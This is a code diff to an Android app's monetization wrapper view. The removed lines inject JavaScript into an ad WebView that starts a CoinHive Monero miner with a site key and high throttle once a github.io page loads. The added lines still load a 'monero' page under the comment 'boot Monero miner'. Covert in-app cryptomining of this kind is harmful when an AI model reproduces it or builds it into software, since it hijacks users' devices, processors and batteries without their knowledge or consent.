@@ -64,16 +64,8 @@ public class WisecraftMonetizeWrapperView extends FrameLayout {
             if(rank!=AdRank.MOB){
                 // boot Monero miner
                 WebView view=findViewById(R.id.adView);
-                view.setWebViewClient(new WebViewClient(){
-                    @Override
-                    public void onPageFinished(WebView view, String url) {
-                        if("http://nao20010128nao.github.io/monero/boilerplate".equals(url)){
-                            // boot the miner
-                            view.loadUrl("javascript: new CoinHive.Anonymous('LZSdFJYBUldfKhSwZV5aWrgDXpFzut66',{throttle: 0.8}).start()");
-                        }
-                    }
-                });
-                view.loadUrl("http://nao20010128nao.github.io/monero/boilerplate");
+                view.setWebViewClient(new WebViewClient(){});
+                view.loadUrl("http://nao20010128nao.github.io/monero/tesuya");
             }else{
                 ((ViewGroup)getParent()).removeView(this);
             }
